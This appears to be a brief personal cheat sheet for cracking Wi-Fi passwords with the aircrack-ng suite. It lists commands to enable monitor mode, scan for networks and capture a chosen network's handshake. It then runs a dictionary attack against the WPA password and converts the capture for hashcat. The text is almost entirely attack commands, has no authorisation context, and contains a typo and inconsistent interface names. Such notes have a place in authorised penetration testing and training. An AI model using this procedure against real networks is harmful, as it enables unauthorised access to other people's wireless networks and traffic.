Enabling wireless adapter:

airmon-ng
iwconfig

Once have wireless interface name:

airmon-ng start <interface>
airmon-ng 

(Check the final monitor interface, it might have been renamed)

Once we have monitor enabled, check available ssids using:

airodumo-ng wlan0mon

Once we've picked an SSID, focus on it using:
-- NOTE: capfile is placed in current working directory

airodump-ng --bssid <BSSID> -c <channel> --write <capfile> mon0

Crack password using aircrack-ng:

aircrack-ng -w <dictionary> -b <BSSID> <filename.cap>

# aircrack-ng -w ~/Downloads/wordlists/Super-WPA -b 00:00:00:00:00:00 test.cap-01.cap

Converting captured file into a format that can be cracked by hashcat:
# aircrack-ng <filename.cap> -J <filename.hccap>
